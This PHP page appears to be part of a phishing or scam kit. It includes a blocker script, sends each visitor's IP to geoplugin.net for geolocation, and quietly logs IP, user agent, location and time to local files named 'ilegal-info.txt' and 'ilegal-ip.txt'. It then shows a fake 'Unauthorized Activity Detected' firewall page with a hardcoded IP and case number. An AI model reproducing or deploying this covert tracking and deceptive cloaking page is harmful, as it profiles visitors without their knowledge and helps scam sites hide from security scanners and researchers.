<?php
error_reporting(0);

include 'blocker.php';
include 'kontol.php';

$dt = date("l, F j Y");
$dt2 = date("h:i:s A");
$ip				= $_SERVER['REMOTE_ADDR'];
$user_agent		= $_SERVER['HTTP_USER_AGENT'];
$details		= json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$nama_negara	= $details->geoplugin_countryName;
$kota			= $details->geoplugin_city;
$state			= $details->geoplugin_regionName;

$msg = "IP		: ".$ip."
User-Agent	: ".$user_agent."
Country		: ".$nama_negara."
City		: " . $kota . "
State		: " . $state . "
Time		: ".$dt2."
Date		: ".$dt."
Check		: http://www.geoplugin.net/json.gp?ip=".$ip."
";

$kntl = "IP : ".$ip."
";

$file=fopen("ilegal-info.txt","a");
fwrite($file, $msg);
fclose($file);

$file=fopen("ilegal-ip.txt","a");
fwrite($file, $kntl);
fclose($file);

$filecounter=("ilegal-total.txt");
$kunjungan=file($filecounter);
$kunjungan[0]++;
$file=fopen($filecounter,"w");
fputs($file,"$kunjungan[0]");
fclose($file);

?>

<HTML>
	<HEAD>
<base href="/" />
<script type="text/javascript">
  var _event_transid='2008202620';
  var _event_clientip='223.255.229.23';
  var _event_clientport='57296';
</script>

		<TITLE>Unauthorized Request Blocked</TITLE>
		<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Expires" content="0" />
	</HEAD>
<BODY>
<BR>
<TABLE align=center cellpadding="0" cellspacing="0" border="0">
	<TR>
	</TR>
</TABLE>
<BR>
<TABLE width="700" align=center cellpadding="0" cellspacing="0" border="0">
    <TR>
		<TD width="60" align="left" valign="top" rowspan="3"></TD>
			<TD id="mainTitleAlign" valign="middle" align="left" width="*">
				<H1>Unauthorized Activity Detected</H1>
			</TD>
	</TR>
	<TR><TD>&nbsp;</TD></TR>
	<TR><TD><DIV class="divider"></DIV><BR><BR></TD></TR>
	<TR><TD></TD>
		<TD>
			<H3>You are seeing this page because we have detected unauthorized activity.<br>
 			If you believe that there has been some mistake, please contact the Administrator<br> 
				<P>
				<table border="0">
					<tr>
						<td>Case Number:</td>
						<td><script language="javascript">if (window._event_transid !== undefined) document.write(window._event_transid);</script></td>
					</tr>
				</table>
			</H3><BR><BR>
		</TD>
	</TR>
</TABLE>
</BODY>
<STYLE>
	body
	{
	font-family: "Segoe UI", "verdana" , "Arial";
	background-repeat: repeat-x;
	margin-top: 20px;
	margin-left: 20px;
	}
	h1
	{
	
	font-size: 2.2em;
	font-weight: normal;
	vertical-align:bottom;
	margin-top: 7px;
	margin-bottom: 4px;
	}

h2 /* used for Heading in Main Body */
	{
	font-size: 1em;
	font-weight: normal;
	margin-top: 20px;
	margin-bottom: 1px;
	}
h3 /* used for text in main body */
	{
	font-size: 1em;
	font-weight: normal;
	line-height: 1.4em;
	margin-top: 10px;
	margin-bottom: 1px;
	}
.divider
	{
	border-bottom: #B6BCC6 1px solid;
	}
</STYLE>
</HTML>